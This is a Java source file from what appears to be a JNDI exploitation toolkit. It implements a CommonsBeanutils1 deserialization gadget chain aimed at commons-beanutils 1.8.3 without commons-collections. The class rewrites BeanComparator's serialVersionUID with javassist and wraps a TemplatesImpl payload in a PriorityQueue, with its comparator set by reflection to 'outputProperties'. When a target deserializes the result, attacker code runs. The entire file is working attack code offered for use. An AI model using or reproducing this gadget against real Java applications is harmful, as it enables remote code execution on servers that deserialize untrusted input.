package com.nu1r.jndi.gadgets;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.gadgets.annotation.Dependencies;
import com.nu1r.jndi.gadgets.utils.Gadgets;
import com.nu1r.jndi.gadgets.utils.Reflections;
import com.nu1r.jndi.gadgets.utils.Serializer;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayOutputStream;
import java.util.Arrays;
import java.util.PriorityQueue;

import static com.nu1r.jndi.gadgets.utils.InjShell.insertField;

@Dependencies({"commons-beanutils:commons-beanutils:1.8.3"})
public class CommonsBeanutils1183NOCC implements ObjectPayload<Object> {

    @Override
    public Object getObject(PayloadType type, String... param) throws Exception {
        final Object template = Gadgets.createTemplatesImpl(type, param);
        ClassPool pool    = ClassPool.getDefault();
        CtClass   ctClass = pool.get("org.apache.commons.beanutils.BeanComparator");

        insertField(ctClass, "serialVersionUID", "private static final long serialVersionUID = -3490850999041592962L;");

        Class                       beanCompareClazz = ctClass.toClass();
        BeanComparator              comparator = (BeanComparator) beanCompareClazz.newInstance();
        final PriorityQueue<Object> queue      = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");

        // switch method called by comparator
        Reflections.setFieldValue(comparator, "property", "outputProperties");
        Reflections.setFieldValue(comparator, "comparator", String.CASE_INSENSITIVE_ORDER);
        Reflections.setFieldValue(queue, "queue", new Object[]{template, template});

        return queue;
    }
}
